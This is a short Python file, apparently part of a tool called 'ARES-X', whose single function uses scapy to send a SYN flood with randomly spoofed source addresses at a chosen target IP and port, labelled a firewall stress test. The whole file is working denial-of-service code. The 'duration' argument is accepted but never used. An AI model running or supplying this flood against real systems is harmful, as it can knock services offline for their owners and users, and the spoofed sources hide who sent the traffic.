# ARES-X File 15: Stress-Testing Module
from scapy.all import IP, TCP, send
import random

def launch_stress_test(target_ip, target_port, duration=60):
    """Performs a SYN flood to test firewall capacity."""
    print(f"[!] ARES-X: Initiating Stress Test on {target_ip}:{target_port}...")
    # This loop generates randomized source IPs to simulate a distributed load
    for _ in range(1000): 
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        packet = IP(src=src_ip, dst=target_ip)/TCP(sport=random.randint(1024,65535), dport=target_port, flags="S")
        send(packet, verbose=False)
